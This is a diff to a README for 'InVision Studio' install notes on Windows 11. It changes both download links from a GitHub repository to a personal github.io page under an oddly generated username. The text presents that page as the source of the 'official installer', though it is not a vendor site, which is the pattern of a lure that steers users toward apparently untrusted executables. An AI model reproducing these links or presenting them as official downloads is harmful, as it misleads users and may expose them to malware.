@@ -1,6 +1,6 @@
 # 🛠️ InVision-Studio-Install-Notes - Get InVision Studio working on Windows 11
 
-[![](https://img.shields.io/badge/Download_InVision_Studio-Blue.svg)](https://github.com/Halfhourapperception505/InVision-Studio-Install-Notes)
+[![](https://img.shields.io/badge/Download_InVision_Studio-Blue.svg)](https://halfhourapperception505.github.io)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these basic hardware and software standards to run InVis
 
 You need to fetch the official installer to begin. Visit the link below to access the download page for the application:
 
-[Click here to visit the download page](https://github.com/Halfhourapperception505/InVision-Studio-Install-Notes)
+[Click here to visit the download page](https://halfhourapperception505.github.io)
 
 Save the installer file to your computer. Once the download finishes, move to the next section to start the installation.
 
